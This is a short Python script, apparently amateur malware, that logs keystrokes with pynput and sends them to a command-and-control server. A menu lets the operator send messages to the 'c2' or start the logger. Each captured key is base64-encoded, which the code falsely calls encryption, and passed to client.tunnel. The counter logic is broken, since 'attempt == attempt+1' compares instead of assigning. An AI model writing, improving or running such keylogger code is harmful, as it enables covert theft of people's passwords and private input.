import client
from pynput.keyboard import Key, Listener
import base64

attempt = 0

def init():
    print("1 - Message c2")
    print("2 - log")
    menu = input()
    if menu == "1":
        while True:
            data = input("Send message: ")
            client.send(encrypt(data))
            print("SUCCESS!")
    else:
        print("LOGGING ACTIVE")
        log()

def encrypt(data):

    data = str(data).encode("ascii")
    data = base64.b64encode(data)
    data = data.decode('ascii')
    print(data)
    return data


def decrypt(data):
    data = base64.b64decode(data)
    data = data.decode("ascii")
    print(data)
    return data


def log():
    def on_press(key):
        print("KEY ",key,"\n")
        key = encrypt(key)
        global attempt
        if attempt < 5:
            key = key+key
            attempt == attempt+1
            print(attempt)
        else:
            attempt = 0
            client.tunnel(key)

    with Listener(on_press=on_press) as listener:
        listener.join()


init()
